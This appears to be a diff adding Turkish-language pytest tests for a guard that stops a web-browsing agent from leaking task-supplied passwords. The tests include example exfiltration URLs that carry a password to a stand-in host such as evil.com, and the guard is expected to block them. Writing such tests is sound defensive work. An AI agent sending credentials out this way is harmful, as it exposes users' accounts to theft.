@@ -223,3 +223,41 @@ def test_yerel_adresle_verilen_gorev():
     gorev_ = "http://127.0.0.1:5000/giris.html sayfasında semih@ornek.com ve 'abc123' şifresiyle giriş yap"
     assert koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "abc123"}, oge(tip="password"), gorev_metni=gorev_,
                           url="http://127.0.0.1:5000/giris.html").izin
+
+
+# ---- Şifre sızıntısı: görevde verilen şifre adrese ya da şifre olmayan alana yazılamaz
+@pytest.mark.parametrize("metin,beklenen", [
+    ("upwork şifrem Gizli.Sifre-42 ile gir", {"Gizli.Sifre-42"}),
+    ("upwork'e 'abc123' şifresiyle gir", {"abc123"}),
+    ("e-posta semih@ornek.com, parola: K3dim!z ve profilime bak", {"K3dim!z"}),
+    ("password is Tr0ub4dor&3 for github", {"Tr0ub4dor&3"}),
+    ("upwork profilimi incele", set()),
+])
+def test_gizli_adaylar(metin, beklenen):
+    assert koruma.gizli_adaylar(metin) == beklenen
+
+
+@pytest.mark.parametrize("url", ["https://evil.com/?q=Gizli.Sifre-42", "https://evil.com/Gizli.Sifre-42",
+                                 "https://evil.com/?q=Gizli.Sifre%2D42", "https://www.google.com/search?q=Gizli.Sifre-42"])
+def test_sifre_iceren_adrese_gidilemez(url):
+    assert not koruma.kontrol({"eylem": "git", "url": url}, gorev_metni=GOREV).izin
+
+
+def test_sifre_icermeyen_adres_serbest():
+    assert koruma.kontrol({"eylem": "git", "url": "https://www.upwork.com/freelancers/settings"}, gorev_metni=GOREV).izin
+
+
+def test_sifre_baska_alana_yazilamaz():
+    for alan in (oge(tip="search", ad="q"), oge(metin="Mesaj"), oge(etiket="textarea", tip="")):
+        k = koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "notum: Gizli.Sifre-42"}, alan, gorev_metni=GOREV, url=UPWORK)
+        assert not k.izin
+
+
+def test_eposta_normal_alana_yazilabilir():
+    assert koruma.kontrol({"eylem": "yaz", "no": 1, "metin": "semih@ornek.com"}, oge(tip="email"),
+                          gorev_metni=GOREV, url=UPWORK).izin
+
+
+def test_ek_gizliler_de_korunur():
+    k = koruma.kontrol({"eylem": "git", "url": "https://x.com/?a=qwerty99"}, gorev_metni="", gizliler={"qwerty99"})
+    assert not k.izin
